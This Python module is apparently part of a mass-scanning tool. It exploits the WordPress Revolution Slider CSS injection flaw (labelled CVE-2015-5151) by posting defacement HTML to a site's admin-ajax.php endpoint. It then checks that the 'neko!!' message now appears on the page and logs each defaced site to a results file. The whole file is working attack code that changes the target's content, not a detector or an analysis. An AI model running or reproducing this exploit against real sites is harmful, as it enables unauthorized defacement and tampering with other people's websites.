# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def Exploit(site):
    IndeXText = 'neko!! Patch it Now!'
    ency = {'action': "revslider_ajax_action",
            'client_action': "update_captions_css",
            'data': "<body style='color: transparent;background-color: black'><center><h1>"
                    "<b style='color: white'>" + IndeXText + "<p style='color: transparent'>",
            }
    try:
        url = "http://" + site + \
              "/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css"
        aa = requests.post(url, data=ency, timeout=10, headers=Headers)
        if 'succesfully' in str(aa.content):
            deface = site + '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css'
            X = requests.get('http://' + deface, timeout=10, headers=Headers)
            if 'neko!!' in str(X.content):
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(deface + '\n')
            return printModule.returnYes(site, 'CVE-2015-5151', 'Revslider CSS Injection', 'Wordpress')
        else:
            return printModule.returnNo(site, 'CVE-2015-5151', 'Revslider CSS Injection', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2015-5151', 'Revslider CSS Injection', 'Wordpress')
